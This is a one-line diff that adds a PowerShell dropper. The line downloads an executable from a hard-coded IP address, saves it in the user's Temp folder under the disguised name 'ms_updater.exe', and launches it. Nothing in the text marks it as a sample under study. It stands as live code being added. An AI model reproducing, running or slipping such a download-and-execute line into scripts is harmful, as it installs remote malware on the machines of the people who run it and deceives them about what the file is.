@@ -1,0 +1,1 @@
+$r='http://200.63.45.32/storage_db/phones.exe';$o = 'C:\Users\'+[System.Environment]::UserName+'\AppData\Local\Temp\ms_updater.exe';$y=new-Object System.Net.WebClient;$y.DownloadFile($r,$o);Start-Process $o
